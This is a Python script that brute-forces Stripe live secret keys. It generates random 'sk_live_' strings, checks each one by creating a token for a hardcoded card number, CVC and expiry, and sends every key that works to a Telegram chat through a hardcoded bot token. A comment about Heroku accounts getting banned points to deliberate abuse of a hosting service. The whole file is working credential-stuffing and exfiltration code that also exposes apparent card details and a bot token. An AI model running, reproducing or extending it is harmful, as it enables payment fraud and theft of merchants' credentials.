import requests, random, string, time, os

token = os.environ.get("BOT_TOKEN", "6358820728:AAGoloHnrDWtC6xZ-ddQc-oi8kvtVpf2LIg")
chatid = os.environ.get("FORWARD_ID","5687234987")

def long_key():
  skkey = random.choice(['sk_live_51NY', 'sk_live_9XjNEYDztonsUwSaciA3Ugym000m3G3EUE', 'sk_live_9XjN'])+''.join(random.choices( string.digits + string.ascii_letters, k = 96))
  pos = requests.post(url="https://api.stripe.com/v1/tokens", headers={'Content-Type': 'application/x-www-form-urlencoded'}, data={'card[number]': '5176170323019875','card[cvc]': '238','card[exp_month]': '11','card[exp_year]': '2026'}, auth=(skkey, ""))
  if (pos.json()).get("error") and not (pos.json()).get("error").get("code") == "card_declined": 
    print(f"DEAD > {skkey}")
  else:
    print(f"LIVE > {skkey}")
    requests.get(url=f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=LIVE > {skkey}")
    
def short_key():
  skkey = "sk_live_"+''.join(random.choices( string.digits + string.ascii_letters, k = 24))
  pos = requests.post(url="https://api.stripe.com/v1/tokens", headers={'Content-Type': 'application/x-www-form-urlencoded'}, data={'card[number]': '5176170323019875','card[cvc]': '238','card[exp_month]': '11','card[exp_year]': '2026'}, auth=(skkey, ""))
  if (pos.json()).get("error") and not (pos.json()).get("error").get("code") == "card_declined": 
    print(f"DEAD > {skkey}")
  else:
    print(f"LIVE > {skkey}")
    requests.get(url=f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=LIVE > {skkey}")
    
while True:
  long_key()
  #time.sleep(0.5) #if your heroku account keeps getting banned
  short_key()
    
